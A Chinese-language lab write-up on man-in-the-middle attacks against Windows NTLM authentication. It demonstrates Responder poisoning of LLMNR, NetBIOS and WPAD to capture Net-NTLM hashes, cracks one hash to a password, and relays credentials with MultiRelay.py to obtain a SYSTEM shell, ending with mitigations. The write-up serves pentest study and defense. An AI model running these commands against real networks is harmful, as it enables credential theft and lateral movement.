[toc]

# 中间人攻击

------

中间人攻击(Man-in-the-Middle Attack，简称“**MITM**攻击”)是指攻击者与通讯的两端分别创建独立的联系，并交换其所收到的数据，使通讯的两端认为他们正在通过一个私密的连接与对方直接对话，但事实上整个会话都被攻击者完全控制。在中间人攻击中，攻击者可以拦截通讯双方的通话并插入新的内容。中间人攻击一个(缺乏)相互认证的攻击。大多数的加密协议都专门加入了一些特殊的认证方法以阻止中间人攻击。例如，SSL协议可以验证参与通讯的一方或双方使用的证书是否是由权威的受信 任的数字证书认证机构颁发，并且能执行双向身份认证。

中间人攻击过程

```
1.客户端发送请求到服务端，请求被中间人截获。
2.服务器向客户端发送公钥。
3.中间人截获公钥，保留在自己手上。然后自己生成一个【伪造的】公钥，发给客户端。
4.客户端收到伪造的公钥后，生成加密hash值发给服务器。
5.中间人获得加密hash值，用自己的私钥解密获得真秘钥。同时生成假的加密hash值，发给服务器。
6.服务器用私钥解密获得假密钥。然后加密数据传输给客户端。
```

<img src="https://i.loli.net/2021/08/02/G7D8KHj46TNdaiJ.png" alt="image-20210802165409819" style="zoom: 67%;" />

> ***中间人攻击的核心理念在于截取hash和传递(假冒认证)***

## 0x01 域和工作组

工作组和域宏观上都是一群计算机的集合，域中计算机的数量规模通常大于工作组内的计算机。

工作组内的机器名义上虽然是属于一个集合，但是内部各计算机还是各自管理各自的，没有一个相对成熟的信任机制，工作组内各个计算机的关系依旧是**点对点**。因此，在工作组环境下进行访问认证，仅涉及Client和Server。我们使用的个人计算机，默认便处于**WORKGROUP**工作组环境下

域是一个有安全边界的计算机集合，同一个域中的计算机通过共同的第三方信任机构建立信任关系，这个第三方信任机构角色由DC(域控制器)担当。通俗来讲，域中的机器都信任域控制器，那么只要域控制器信任我们，我们就可以在域内获得对其他服务器的访问权限。在这种认证体系中涉及三方：**Client、Server、DC**

VMware中域环境的搭建详见：

> [VMware中用虚拟机模拟搭建域（步骤、讲解详实，并以浅显的方式讲解了VMware中的三种网络模式、IP配置），Windows Server 2008 R2为域控服务器，Win7为域成员服务器_胖胖的飞象的博客-CSDN博客_虚拟机怎么创建域](https://blog.csdn.net/weixin_36711901/article/details/102995640)

## 0x02 NTLM认证(Windows)

### 本地认证

Windows不存储用户的明文密码，它会将用户的明文密码经过加密后存储在 SAM (*Security Account Manager Database*，安全账号管理数据库)文件中。

>  SAM文件的路径是 `%SystemRoot%\system32\config\sam`

在进行本地认证的过程中，当用户登录时，系统将用户输入的明文密码加密成 *`NTLM Hash`*，与 SAM数据库中的 *`NTLM Hash`* 进行比较，从而实现认证

```bash
winlogon.exe -> 接收用户输入 -> lsass.exe -> 认证
```

首先，用户注销、重启、锁屏后，操作系统会让 `winlogon`显示登录界面，也就是输入框，接收输入后，将密码交给 `lsass`进程，*这个进程中会存一份明文密码*，将明文密码加密成`NTLM Hash`，对比 SAM数据库中的Hash进行验证

#### NTLM Hash的生成

- 明文密码：`123456`
- 首先，密码经过十六进制ASCⅡ转为 -> `313233343536`
- 将十六进制结果转为 Unicode格式 ->`310032003300340035003600`
- 以 Hex（16进制）数据作MD4加密 ->`32ED87BDB5FDC5E9CBA88547376818D4`

> 由于NTLM Hash的算法公开，故获得的Hash可暴力破解(MD4单向不可逆)

### 网络认证

NTLM凭据包括**域名**，**用户名**和**用户密码的单向Hash**。用户的密码不会在网络链路中传输，加密之后的Challenge值取代原本密码的作用进行对比验证，与传统传输密码的方式相比，具有较高的安全性

NTLM的认证方式分为交互式和交互式

- 通过网络进行的**交互式NTLM身份验证**通常涉及两个系统：**客户端系统**，用户用于请求身份验证；**域控制器**，其中保留与用户密码有关的信息；交互式提供必要凭据，应用场景通常为用户要登录某台客户端
- **NTLM非交互式身份验证**通常涉及NTLM三个系统：**客户端**，**服务器**和**代表服务器进行身份验证计算的域控制器**；无需交互式提供凭据，实际应用更多为**已登录某客户端的用户去请求另一台服务器的资源** ，即用户只需要登录一次即可访问所有相互信任的应用系统及共享资源

#### 工作组环境NTLM认证流程

```
1.用户访问客户机并提供域名，用户名，密码。客户端计算密码的Hash，并丢弃实际密码。
2.客户端将用户名发送到服务器。
3.服务器生成一个16字节的随机数Challenge并发送给客户端。
4.客户端使用用户密码的Hash对Challenge进行加密，然后将结果response(Net-NTLM hash)返回给服务器。
5.服务器使用用户名从SAM数据库中检索用户密码Hash，使用此密码Hash对Challenge进行加密。
6.服务器将其加密的Challenge（在步骤5中）与客户端计算的response（在步骤4中）进行比较。如果它们相同则身份验证成功。
```

![image-20210802213128690](https://i.loli.net/2021/08/02/MFWRKurpgJbavOH.png)

#### 域环境NTLM认证

```
1.用户访问客户机并提供域名，用户名，密码。客户端计算密码的Hash，并丢弃实际密码。
2.客户端将用户名发送到服务器。
3.服务器生成一个16字节的随机数Challenge并发送给客户端。
4.客户端使用用户密码的Hash对Challenge进行加密，然后将结果response(Net-NTLM hash)返回给服务器。
5.服务器将三个信息发送到域控制器：用户名，发送给客户机的Challenge，返回给服务器的response。
6.域控制器使用用户名从SAM数据库中检索用户密码Hash。使用此密码Hash对Challenge进行加密。
7.域控制器将其加密的Challenge（在步骤6中）与客户端计算的response（在步骤4中）进行比较。如果它们相同则身份验证成功。
```

<img src="https://i.loli.net/2021/08/03/ChDv1n8sLBeVJdz.png" alt="image-20210803080036544" style="zoom:67%;" />

>  **域环境Server会将认证信息使用netlogon协议发送给域控制器，由域控制器完成检验并返回认证结果**

## 0x03 域名解析协议

### LLMNR

从 **Windows Vista** 起，Windows 操作系统开始支持一种新的名称解析协议 —— LLMNR，主要用于局域网中的名称解析。**链路本地多播名称解析**（LLMNR）是一个基于协议的域名系统（DNS）数据包的格式，使得双方的IPv4和IPv6的主机来执行名称解 析为同一本地链路上的主机。当局域网中的DNS服务器不可用时， DNS客户端会使用LLMNR本地链路多播名称解析来解析本地网段上的 主机的名称，直到网络连接恢复正常为止。

#### 解析过程

一个完整的正常的 LLMNR 名称解析过程如下图所示：

**注：假定主机 B 已加入了组播组中。**

![image-20210803081906640](https://i.loli.net/2021/08/03/RsauDponXBP2wKY.png)

------



### NetBIOS

<img align = "right" src = "https://i.loli.net/2021/08/03/WEdHQcCwLOzDlNT.png" style="zoom: 80%;" >NetBIOS(Network Basic Input Output System)：网络基本输入输出 系统，它提供了OSI模型中的会话层服务，让在不同计算机上运行的 不同程序，可以在局

域网中，互相连线，以及分享数据。严格来说， NetBIOS是一种应用程序接口(API)，系统可以利用WINS服务、广播及 Lmhosts文件等多种模式将NetBIOS名解

析为相应IP地址，几乎所有的 局域网都是在NetBIOS协议的基础上工作的。NetBIOS也是计算机的 标识名称，主要用于局域网内计算机的互访。NetBIOS名称是

一个长度为16个字符的字符串。MS网络中用到NetBIOS名称的地方有：计算机名，域名，工作组名。



















查看当前机器注册的NetBIOS名称：

```
nbtstat -n
```

<img align = "left" src="https://i.loli.net/2021/08/03/NK6JC9kLVOAqlxX.png" alt="image-20210803083305277"  />

查看当前的NetBIOS名称缓存区：

```
nbtstat -c 
```

查看 NetBIOS节点类型：

```
ipconfig /all
```

<img align = "left" src="https://i.loli.net/2021/08/03/2p4Sux9QjmvE3qh.png" alt="image-20210803083606700" />

采用H节点的WINS客户端，其NetBIOS名称解析的完整顺序为：

```
1. 检查要查询的计算机名称是不是自己的计算机名称。
2. 检查NetBIOS名称缓存区。
3. 向WINS服务器查询。
4. 发出广播消息。
5. 检查Lmhosts文件。
6. 检查hosts文件或向DNS服务器查询。
```

> Lmhosts文件和hosts文件存放于 `%Systemroot%\System32\drivers\etc`目录下。

###  Windows系统域名解析顺序

```
1. 本地hosts文件（%Systemroot%\System32\drivers\etc\hosts）
2. DNS缓存/DNS服务器
3. 链路本地多播名称解析（LLMNR）和NetBIOS名称服务（NBNS）
```
**也就是说，如果在缓存中没有找到名称，DNS名称服务器又请求失败时，Windows系统就会通过LLMNR和NetBIOS名称服务在本地进行名称解析。这时，客户端就会将未经认证的UDP广播到网络中，询问它是否为本地系统的名称。**

------

## 0x04 WPAD

**WPAD（Web Proxy Auto-Discovery Protocol）** 是 Web 代理自动发现协议的简称，该协议的功能是可以使局域网中用户的浏览器可以自动发现内网中的代理服务器，并使用已发现的代理服务器连接互联网或者企业内网。WPAD 支持所有主流的浏览器，从 IE 5.0 开始就已经支持了代理服务器自动发现/切换的功能，不过苹果公司考虑到 WPAD 的安全风险，在包括 OSX 10.10 及之后版本的操作系统中的 Safari 浏览器将不再支持 PAC 文件的解析。

### 工作原理

当系统开启了代理自动发现功能后，用户使用浏览器上网时，浏览器就会在当前局域网中自动查找代理服务器，如果 找到了代理服务器，则会从代理服务器中下载一个名为 **PAC（Proxy Auto-Config）** 的配置文件。该文件中定义了用 户在访问一个 URL 时所应该使用的代理服务器。浏览器会下载并解析该文件，并将相应的代理服务器设置到用户的浏览器中。

WPAD可以在IE浏览器的 **Internet 选项 — 连接 — 局域网设置 — 自动检测设置** 中看到，系统默认是勾选此功能的。

### WPAD劫持

WPAD 通常用 DNS 来配置，客户端主机向 DNS 服务器发起了 WPAD＋X 的查询请求。如果客户端主机是处于域环境下时，发起的 WPAD+X 的查询请求为 “WPAD.当前域的域名”。DNS 服务器对 WPAD 主机的名称进行解析返回 WPAD 主机的 IP 地址，客户端主机通过 WPAD 主机的 IP 的 80 端口下载并解析 PAC 文件。

> 若DNS服务器没有该记录，**则会降为LLMNR+NetBIOS名称查询**

<img src="https://i.loli.net/2021/08/03/EFfw5xd7hsnWtoU.png" alt="image-20210803154531889" style="zoom:80%;" />

## 0x05 NTLM中继

NTLM 身份验证被封装在其他协议中，但是无论覆盖的协议是什么，消息都是相同的。这允许在其他协议中使用 NTLM 消息。例如，使用 HTTP 进行身份验证的客户端会在“ Authorization”标头中发送 NTLM 身份验证消息。攻击者可以从 HTTP 头中提取这些消息，并在其他协议中使用它们，比如 SMB。

> NTLM支持多种协议，例如SMB、HTTP(S)、LDAP、IMAP、SMTP、POP3和MSSQL。

根据上文提到的工作组环境和域环境的网络认证过程，可实现NTLM中继，获取低权限主机的shell

中继到 SMB 是一种典型的攻击手法。这种攻击会中继到 SMB 允许攻击者在禁用 SMB 签名的主机上执行文件，如果被中继的用户在该主机上具有管理特权。利用Responder中Multi-relay模块，允许攻击者与共享进行交互，例如下载或上传文件，它将生成一个本地 TCP shell 进行连接。

## 0x06 Responder介绍

Responder是监听LLMNR和NetBIOS协议的工具之一，能够抓取网络中所有的LLMNR和NetBIOS请求并进行响应，获取最初的账户凭证。 Responder会利用内置SMB认证服务器、MSSQL认证服务器、HTTP 认证服务器、HTTPS认证服务器、LDAP认证服务器，DNS服务器、 WPAD代理服务器，以及FTP、POP3、IMAP、SMTP等服务器，收集目标网络中的明文凭据，还可以通过Multi-Relay功能在目标系统中执行命令。

Github地址: 

> [SpiderLabs/Responder: Responder is a LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication. (github.com)](https://github.com/SpiderLabs/Responder)

kali中内置Responder

<img align = "left" src = "https://i.loli.net/2021/08/03/tapnIxs28lKghY4.png" style="zoom:80%;" >

> **Responder原理本质在于受害机监听同域内中所有主机的广播请求，并且伪造应答(poisoning)，达到截取hash值的目的**。

------



# 攻击演示

**测试环境：**

```
   kali(被控主机) :  172.16.56.130

​	windows 7 : 172.16.56.11

​	windows server 2008 R2 (DC) : 172.16.56.10
```

## 利用LLMNR和NetBIOS截取Net-NTLM Hash

> 两台域内主机默认开启LLMNR和NetBIOS名称服务

对于SMB协议，客户端在连接服务端时，默认先使用本机的用户名和密码hash尝试登录，所以 可以模拟SMB服务器从而截获hash，执行如下命令都可以得到hash。

**1. 开启监听**

```
responder -I eth0 -f
```

<img align = "left" src="https://i.loli.net/2021/08/03/U8a9ND6FxmdAkuI.png" alt="_20210803102000" style="zoom:80%;" />

**2. win7操作**

> 在网络上连接一个无法解析的域名
>
> ```
> net use \\whoami
> ```

<img align = "left" src="https://i.loli.net/2021/08/03/Gulv2Pp5fYkD1R3.png" alt="_20210803103047" />

截获的Hash值

<img align = "left" src="https://i.loli.net/2021/08/03/8WlvOwYzhItKy1V.png" alt="_20210803103407" style="zoom:80%;" />

> Responder会将所有抓取到的数据存储到 /usr/share/responder/logs/ 文件夹下，会为每个service-proto-IP生成 唯一的文件。使用responder抓取的通常就是Net-NTLM Hash。攻击者无法使用Net-NTLM Hash进行哈希传递攻击，只能使用hashcat、John等工具爆破或进行 NTLM-Relay攻击。

**3. 使用工具进行爆破**

<img align = "left" src="https://i.loli.net/2021/08/03/Q1kIBTSErnuM3tb.png" alt="_20210803104656" style="zoom:80%;" />

得到明文密码010612和用户名John

## 利用WPAD劫持获得Net-NTLM Hash

> Responder可以创建一个假WPAD服务器，并响应客户端的WPAD名称解析。 然后客户端请求这个假WPAD 服务器的wpad.dat文件。

**1. 创建WPAD服务器并开启监听**

```
responder -I eth0 -v -w -F
```

**2. win7操作**

``` 
开启WPAD代理后访问网页并登陆
```

<img align = "left" src="https://i.loli.net/2021/08/03/jzO4EcX3Jr9d5xB.png" alt="_20210803110048" style="zoom: 80%;" />

截取的Hash值

<img align = "left" src="https://i.loli.net/2021/08/03/vlKJNuywSZckYVP.png" alt="_20210803110309" style="zoom:80%;" />

## SMB Relay

利用Responder/tools/MultiRelay.py可实现NTLM认证中继到SMB中去

**1. 修改Responder.conf文件关闭HTTP和SMB服务器**

<img align = "left" src="https://i.loli.net/2021/08/03/1HmLPjrKpcZulXO.png" alt="截图_选择区域_20210803143821" style="zoom:80%;" />

**2. 查看域内SMB签名开启状况**

<img align = "left" src="https://i.loli.net/2021/08/03/ECkNToiMGDLbFKP.png" alt="截图_选择区域_20210803143431" style="zoom:80%;" />

**2. 开启监听**

```
responder -I eth0 -v 
```

**3. 新建终端，运行MultiRelay.py脚本**

```
python3 MultiRelay.py -t 172.16.56.11 -u ALL
```

**4. win sever 2008 操作**

> 随便上传点SMB流量 :smile:
>
> ```
> net use \\wuqian
> ```

**拿到win7的shell**

```shell
┌──(root💀kali)-[/usr/share/responder/tools]
└─# python3 MultiRelay.py -t 172.16.56.11 -u ALL

Responder MultiRelay 2.5 NTLMv1/2 Relay

Send bugs/hugs/comments to: laurent.gaffie@gmail.com
Usernames to relay (-u) are case sensitive.
To kill this script hit CTRL-C.

/*
Use this script in combination with Responder.py for best results.
Make sure to set SMB and HTTP to OFF in Responder.conf.

This tool listen on TCP port 80, 3128 and 445.
For optimal pwnage, launch Responder only with these 2 options:
-rv
Avoid running a command that will likely prompt for information like net use, etc.
If you do so, use taskkill (as system) to kill the process.
*/

Relaying credentials for these users:
['ALL']


Retrieving information for 172.16.56.11...
SMB signing: False
Os version: 'Windows 7 Professional 7601 Service Pack 1'
Hostname: 'JOHN-PC'
Part of the 'CORP' domain
[+] Setting up SMB relay with SMB challenge: 2a92d665043bd7d4
[+] Received NTLMv2 hash from: 172.16.56.10 
[+] Client info: ['eWindows Server 2008 HPC Edition 7601 Service Pack 1', domain: 'CORP', signing:'False']                                                                          
[+] Username: Administrator is whitelisted, forwarding credentials.
[+] SMB Session Auth sent.
[+] Looks good, Administrator has admin rights on C$.
[+] Authenticated.
[+] Dropping into Responder's interactive shell, type "exit" to terminate

Available commands:
dump               -> Extract the SAM database and print hashes.
regdump KEY        -> Dump an HKLM registry key (eg: regdump SYSTEM)
read Path_To_File  -> Read a file (eg: read /windows/win.ini)
get  Path_To_File  -> Download a file (eg: get users/administrator/desktop/password.txt)
delete Path_To_File-> Delete a file (eg: delete /windows/temp/executable.exe)
upload Path_To_File-> Upload a local file (eg: upload /home/user/bk.exe), files will be uploaded in \windows\temp\
runas  Command     -> Run a command as the currently logged in user. (eg: runas whoami)
scan /24           -> Scan (Using SMB) this /24 or /16 to find hosts to pivot to
pivot  IP address  -> Connect to another host (eg: pivot 10.0.0.12)
mimi  command      -> Run a remote Mimikatz 64 bits command (eg: mimi coffee)
mimi32  command    -> Run a remote Mimikatz 32 bits command (eg: mimi coffee)
lcmd  command      -> Run a local command and display the result in MultiRelay shell (eg: lcmd ifconfig)
help               -> Print this message.
exit               -> Exit this shell and return in relay mode.
                      If you want to quit type exit and then use CTRL-C

Any other command than that will be run as SYSTEM on the target.

Connected to 172.16.56.11 as LocalSystem.
C:\Windows\system32\:#
```

<img align = "left" src="https://i.loli.net/2021/08/03/i2Tfg17PoLZIbSX.png" alt="截图_选择区域_20210803144439" style="zoom:80%;" />

## 总结

windows的NTLM认证在多种协议例如HTTP,SMB,WPAD,MSSQL中得到广泛应用，但该认证安全性不能得到保证，可通过中间人攻击获取Hash或者中继达到域内横向渗透。如何防范是我们关心的问题

```
1.关闭LLMNR以及NetBIOS服务
2.关闭WPAD代理服务器
3.将域内主机ip添加到本地hosts文件中
4.添加SMB签名
```

## **Reference**

>[NTLM 中继攻击的几种非主流玩法 - 云+社区 - 腾讯云 (tencent.com)](https://cloud.tencent.com/developer/news/476984#:~:text=NTLM 中继攻击的几种非主流玩法. 在企业组织中的常见的一种安全风险是凭证重用，当攻击者攻击 NT LAN Manager 身份验证协议 (以下简称,身份验证)时就会出现这样的风险，而这个协议通常会在 微软的 活动目录 中默认启用。. NTLM 认证中的不安全性已经被安全研究人员发现超过15年了。. 该协议可以被滥用，通过一个称为“中继”的过程劫持受害者的会话，该过程通过将受害者的凭证转发到与预期不同的服务来滥用受害者的凭证。. 在许多情况下，NTLM身份验证仍然受到默认的支持和启用，尽管它已经被更安全的Kerberos取代，成为默认的身份验证方法。.)
>
>[利用 LLMNR 名称解析缺陷劫持内网指定主机会话 – Her0in | 漏洞人生 (vuln.cn)](http://www.vuln.cn/6761)
>
>[利用 NetBIOS 协议名称解析及 WPAD 进行内网渗透 – Her0in | 漏洞人生 (vuln.cn)](http://www.vuln.cn/6762)
>
>[SMB relay攻击复现 - 简书 (jianshu.com)](https://www.jianshu.com/p/9627962db4da)
>
>[浅析SMB relay攻击手法_红帽社区 (redhatzone.com)](https://www.redhatzone.com/ask/article/1459.html)
>
>[内网渗透测试：NTLM Relay攻击分析 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/network/244375.html)
>
>[内网渗透之Responder与Net-NTML hash - 简书 (jianshu.com)](https://www.jianshu.com/p/1b545a8b8b1e)
